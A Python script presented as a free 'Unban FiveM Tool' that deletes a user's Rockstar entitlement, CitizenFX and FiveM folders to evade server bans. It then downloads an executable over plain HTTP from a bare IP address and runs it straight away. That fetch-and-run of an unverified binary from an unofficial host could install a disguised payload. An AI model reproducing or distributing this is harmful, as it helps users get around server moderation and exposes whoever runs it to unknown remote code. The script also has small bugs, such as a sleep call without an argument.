# V1.0 LOGOUT ROCKSTAR ACCOUNT FOR FIVEM UNBAN SERVERS! B)
import colorama
from colorama import Fore, Back, Style
import os
from os import path
import time
from urllib import request
import subprocess
import psutil
import shutil
import stat

os.system("title STARSCRIPTSX - Unban FiveM Tool - Free 😎")

def clearconsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)


def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

pathdDigitalEntitlements = os.getenv('LOCALAPPDATA') + "\DigitalEntitlements"
pathCitizenFX = os.getenv('APPDATA') + "\CitizenFX"
pathFiveM = os.getenv('LOCALAPPDATA') + "\FiveM"

print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.WHITE}Welcome back, " + os.getlogin())
time.sleep(1.5)
clearconsole()

def main():
    if path.exists(pathdDigitalEntitlements):
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.WHITE}Removing account...")
        shutil.rmtree(pathdDigitalEntitlements)
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.GREEN}Removed!")
        time.sleep(0.3)
    else:
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.RED}We couldnt find an account")
        time.sleep(0.3)

    if path.exists(pathCitizenFX):
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.WHITE}Spoofing bans from servers (Step 1/2)...")
        filelist = [ f for f in os.listdir(pathCitizenFX) if f.endswith("gta5_settings.xml") ]
        for f in filelist:
            os.remove(os.path.join(pathCitizenFX, f))
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.GREEN}Spoofed step 1, starting step 2...")
        time.sleep(0.3)
    else:
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.RED}Spoof step 1 already done, skipping to step 2")
        time.sleep(0.3)

    if path.exists(pathFiveM):
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.WHITE}Spoofing bans from servers (Step 2/2) - Deleting FiveM...")
        if path.exists(pathFiveM + "\FiveM.app"):
            os.chmod(pathFiveM + "\FiveM.app", stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
        shutil.rmtree(pathFiveM)
        time.sleep(0.3)
    else:
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.RED}Spoof step 2 already done, skipping to download FiveM")
        time.sleep(0.3)
    os.mkdir(pathFiveM)
    request.urlretrieve("http://51.255.48.190/FiveM.exe", pathFiveM + "\FiveM.exe")
    clearconsole()
    print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.BLUE}Downloading FiveM...")
    fiveminstaller = subprocess.Popen([pathFiveM + "\FiveM.exe"])
    fiveminstaller.wait()
    time.sleep(1)
    while True:
        time.sleep(0.5)
        if checkIfProcessRunning("FiveM"):
            time.sleep(0.1)
        else:
            break

    clearconsole()
    print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.GREEN}Bans spoofed, remember dont connect {Fore.RED}discord{Fore.GREEN} and if you have it connected disconnect it and spoof other time...")
    time.sleep(5)
main()

def joindsc():
    areyousure = input(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] You want join the dsc? (Y/N): ")
    if areyousure.lower() == "y" or areyousure.lower() == "yes":
        import webbrowser

        webbrowser.open("https://discord.gg/5ZwdYhJUjc")
    elif areyousure.lower() == "n" or areyousure.lower() == "no":
        clearconsole()
        print(f"{Style.RESET_ALL}[{Fore.YELLOW}!{Style.RESET_ALL}] {Fore.RED}Closing in 3 seconds...")
        time.sleep()
    else:
        joindsc()
